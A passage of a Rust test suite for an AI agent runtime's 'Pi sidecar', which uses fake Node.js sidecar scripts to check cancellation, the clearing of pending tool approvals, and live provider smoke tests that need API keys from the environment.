    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "heartbeat-cancel.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type !== "run") return;
  ready(message);
  emit({{ type: "assistant_delta", request_id: message.request_id, delta: "." }});
  setInterval(() => emit({{ type: "heartbeat", request_id: message.request_id, ts: Date.now() }}), 20);
  setInterval(() => emit({{ type: "assistant_delta", request_id: message.request_id, delta: "." }}), 20);
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let _timing = set_test_sidecar_timing(Duration::from_secs(2), Duration::from_secs(60));
    let (db, session_id) = create_test_db(project.path());
    let cancel = Arc::new(AtomicBool::new(false));
    let loop_ = make_loop(
        project.path(),
        db,
        session_id,
        AgentRunMode::Plan,
        run_mode_permission(AgentRunMode::Plan, false, None, Arc::new(AlwaysApproveHook)),
        Some(cancel.clone()),
    );
    let provider_config_id = 507;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();
    let cancel_task = tokio::spawn({
        let cancel = cancel.clone();
        async move {
            tokio::time::sleep(Duration::from_millis(100)).await;
            cancel.store(true, Ordering::SeqCst);
        }
    });

    let started = Instant::now();
    let mut events = Vec::new();
    let err = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "cancel long Pi turn",
        Some(state_root.path().to_path_buf()),
        &mut |event| events.push(event),
    )
    .await
    .unwrap_err();
    cancel_task.await.unwrap();

    assert!(
        started.elapsed() < Duration::from_secs(5),
        "cancel did not interrupt the long Pi turn"
    );
    assert!(
        matches!(err, AgentError::Cancelled),
        "unexpected long-turn cancel result: {err:?}"
    );
    let state: PiRuntimeState = serde_json::from_slice(
        &std::fs::read(runtime_state_path(state_root.path(), session_id)).unwrap(),
    )
    .unwrap();
    assert_eq!(state.status, "cancelled");
}

#[tokio::test]
async fn pending_tool_approval_cancel_aborts_sidecar_and_clears_pending_approvals() {
    let _serial = fake_sidecar_test_lock();
    let project = tempfile::tempdir().unwrap();
    std::fs::write(project.path().join("approval.txt"), "pending").unwrap();
    let scripts = tempfile::tempdir().unwrap();
    let script = write_fake_sidecar(
        scripts.path(),
        "pending-approval-cancel.mjs",
        &format!(
            r#"{}
rl.on("line", (line) => {{
  const message = JSON.parse(line);
  if (message.type === "run") {{
    ready(message);
    emit({{
      type: "tool_call",
      request_id: message.request_id,
      tool_call_id: "approval_call",
      name: "read_file",
      params: {{ path: "approval.txt" }}
    }});
    setInterval(() => emit({{ type: "heartbeat", request_id: message.request_id, ts: Date.now() }}), 20);
  }} else if (message.type === "tool_result") {{
    emit({{ type: "turn_succeeded", request_id: "pending-approval-cancel", assistant_text: "unexpected" }});
  }}
}});
"#,
            fake_sidecar_prelude()
        ),
    );
    let _guard = set_test_sidecar_script_path(script);
    let _timing = set_test_sidecar_timing(Duration::from_secs(2), Duration::from_secs(60));
    let (db, session_id) = create_test_db(project.path());
    let step_context = insert_active_step_mapping(&db, session_id);
    let pending = PendingApprovals::new();
    let cancel = Arc::new(AtomicBool::new(false));
    let mut loop_ = make_loop(
        project.path(),
        db.clone(),
        session_id,
        AgentRunMode::Build,
        run_mode_permission(
            AgentRunMode::Build,
            true,
            Some(step_context.step_id),
            Arc::new(AwaitUserHook::new(pending.clone(), false)),
        ),
        Some(cancel.clone()),
    );
    loop_.step_context = Some(step_context.clone());
    let provider_config_id = 508;
    let keyring = api_keyring(provider_config_id);
    let state_root = tempfile::tempdir().unwrap();
    let cancel_task = tokio::spawn({
        let pending = pending.clone();
        let cancel = cancel.clone();
        async move {
            for _ in 0..100 {
                if pending.pending_count() > 0 {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            assert_eq!(pending.pending_count(), 1);
            cancel.store(true, Ordering::SeqCst);
        }
    });

    let mut events = Vec::new();
    let err = run_supervised_turn(
        &keyring,
        &api_key_descriptor(),
        provider_config_id,
        &loop_,
        session_id,
        "cancel while approval is pending",
        Some(state_root.path().to_path_buf()),
        &mut |event| events.push(event),
    )
    .await
    .unwrap_err();
    cancel_task.await.unwrap();

    assert!(
        matches!(err, AgentError::Cancelled),
        "unexpected pending approval cancel result: {err:?}"
    );
    assert_eq!(pending.pending_count(), 0);
    assert!(events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolCallStart { id, .. } if id == "approval_call"
    )));
    assert!(!events.iter().any(|event| matches!(
        event,
        AgentEvent::ToolResult { call_id, .. } if call_id == "approval_call"
    )));
    let state: PiRuntimeState = serde_json::from_slice(
        &std::fs::read(runtime_state_path(state_root.path(), session_id)).unwrap(),
    )
    .unwrap();
    assert_eq!(state.status, "cancelled");
    assert_eq!(state.tool_calls_seen, 1);

    let db_guard = db.lock().unwrap();
    let mapping =
        crate::db::dao::step_session_mapping::get_by_step(db_guard.conn(), step_context.step_id)
            .unwrap()
            .unwrap();
    assert_eq!(mapping.status, "blocked");
    let logs = crate::db::dao::event_log::list_by_session(db_guard.conn(), session_id).unwrap();
    assert!(logs.iter().any(|row| {
        row.r#type == "plan_step_state_changed"
            && row.payload["message"] == "Step blocked by retryable Pi runtime error"
            && row.payload["runtime"] == "pi_sidecar"
    }));
}

#[tokio::test]
#[ignore = "requires DIVE_PI_OPENAI_API_KEY and DIVE_PI_OPENAI_MODEL; widens allowlist only after this passes on a real host"]
async fn live_openai_provider_parity_smoke() {
    live_api_key_provider_parity_smoke("openai", "DIVE_PI_OPENAI_API_KEY", "DIVE_PI_OPENAI_MODEL")
        .await;
}

#[tokio::test]
#[ignore = "requires DIVE_PI_ANTHROPIC_API_KEY and DIVE_PI_ANTHROPIC_MODEL; widens allowlist only after this passes on a real host"]
async fn live_anthropic_provider_parity_smoke() {
    live_api_key_provider_parity_smoke(
        "anthropic",
        "DIVE_PI_ANTHROPIC_API_KEY",
        "DIVE_PI_ANTHROPIC_MODEL",
    )
    .await;
}

#[tokio::test]
#[ignore = "requires DIVE_PI_OPENROUTER_API_KEY and DIVE_PI_OPENROUTER_MODEL; widens allowlist only after this passes on a real host"]
async fn live_openrouter_provider_parity_smoke() {
    live_api_key_provider_parity_smoke(
        "openrouter",
        "DIVE_PI_OPENROUTER_API_KEY",
        "DIVE_PI_OPENROUTER_MODEL",
    )
    .await;
}

#[tokio::test]
#[ignore = "custom OpenAI-compatible Pi provider registration/base URL is explicitly deferred; scaffold only"]
async fn live_custom_openai_provider_parity_smoke_deferred() {
    panic!(
            "manual/live scaffold: custom provider parity requires Phase A2/A3 custom base-url registration before it can run"
        );
}

#[tokio::test]
#[ignore = "requires local DIVE Codex OAuth keyring credentials and performs a live model turn"]
async fn live_codex_smoke_uses_dive_keyring_and_custom_tool() {
    let provider_config_id = std::env::var("DIVE_PI_SIDECAR_LIVE_PROVIDER_CONFIG_ID")
        .expect("set DIVE_PI_SIDECAR_LIVE_PROVIDER_CONFIG_ID")
        .parse::<i64>()
        .expect("provider id must be an integer");
    let cwd = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .expect("app dir")
        .parent()
        .expect("repo dir")
        .to_path_buf();
    let keyring = auth::OsKeyring::new();
    let model = std::env::var("DIVE_PI_SIDECAR_LIVE_MODEL").ok();
    let result = run_codex_smoke(&keyring, provider_config_id, cwd, model)
        .await
        .expect("live pi sidecar smoke");
    #[cfg(unix)]
    assert_eq!(result.auth_file_mode, "600");
    #[cfg(not(unix))]
    assert_eq!(result.auth_file_mode, "platform-default");
    assert_eq!(result.enabled_tools, ["dive_context"]);
    assert_eq!(result.tool_calls_seen, 1);
    assert_eq!(result.assistant_text, SMOKE_MARKER);
}

#[tokio::test]
#[ignore = "requires local DIVE Codex OAuth keyring credentials and performs a live supervised DIVE tool turn"]
async fn live_supervised_turn_uses_dive_tool_execution() {
    let provider_config_id = std::env::var("DIVE_PI_SIDECAR_LIVE_PROVIDER_CONFIG_ID")
        .expect("set DIVE_PI_SIDECAR_LIVE_PROVIDER_CONFIG_ID")
        .parse::<i64>()
        .expect("provider id must be an integer");
    let project = tempfile::tempdir().unwrap();
    std::fs::write(
        project.path().join("phase3.txt"),
        "phase3 supervised tool body",
    )
    .unwrap();

    let mut db = crate::db::Database::open_in_memory().unwrap();
    db.migrate().unwrap();
    let project_id = crate::db::dao::project::insert(
        db.conn(),
        &crate::db::models::NewProject {
            name: "phase3".into(),
            path: project.path().display().to_string(),
            provider_default: None,
            model_default: None,
        },
    )
    .unwrap();
    let session_id = crate::db::dao::session::insert(
        db.conn(),
        &crate::db::models::NewSession {
            project_id,
            title: "phase3".into(),
            ended_at: None,
            status: "active".into(),
        },
    )
    .unwrap();

    let loop_ = AgentLoop::builder()
        .provider(std::sync::Arc::new(crate::providers::MockProvider::new(
            Vec::new(),
        )))
        .registry(std::sync::Arc::new(
            crate::tools::ToolRegistry::with_builtins(),
        ))
        .permission(std::sync::Arc::new(
            crate::agent::RunModePermissionHook::new(
                crate::agent::AgentRunMode::Plan,
                std::sync::Arc::new(crate::agent::AlwaysApproveHook),
            ),
        ))
        .db(std::sync::Arc::new(std::sync::Mutex::new(db)))
        .tool_ctx(crate::tools::ToolContext::new(project.path(), session_id))
        .model(DEFAULT_MODEL)
        .run_mode(crate::agent::AgentRunMode::Plan)
        .build()
        .unwrap();

    let keyring = auth::OsKeyring::new();
    let state_root = tempfile::tempdir().unwrap();
    let mut events = Vec::new();
    let result = run_codex_supervised_turn(
            &keyring,
            provider_config_id,
            &loop_,
            session_id,
            "Use the read_file tool exactly once with path \"phase3.txt\". After the tool result, reply exactly DIVE_PI_SUPERVISED_TOOL_OK and nothing else.",
            Some(state_root.path().to_path_buf()),
            &mut |event| events.push(event),
        )
        .await
        .expect("live supervised turn");

    assert_eq!(result.auth_file_mode, "600");
    assert_eq!(
        result.enabled_tools,
        [
            "delete_file",
            "edit_file",
            "list_dir",
            "mkdir",
            "preview_open",
            "read_file",
            "run_process",
            "run_terminal_script",
            "search_files",
            "write_file"
        ]
    );
    assert_eq!(result.tool_calls_seen, 1);
    assert_eq!(result.assistant_text, "DIVE_PI_SUPERVISED_TOOL_OK");
    let state_path = runtime_state_path(state_root.path(), session_id);
    let state: PiRuntimeState =
        serde_json::from_slice(&std::fs::read(&state_path).unwrap()).unwrap();
    assert_eq!(state.status, "completed");
    assert_eq!(state.tool_calls_seen, 1);
    assert_eq!(state.message_count, 1);
    assert_eq!(file_mode_string(&state_path).unwrap(), "600");
    assert!(state.error.is_none());
    assert!(events
        .iter()
        .any(|event| matches!(event, AgentEvent::ToolResult { success: true, .. })));
}
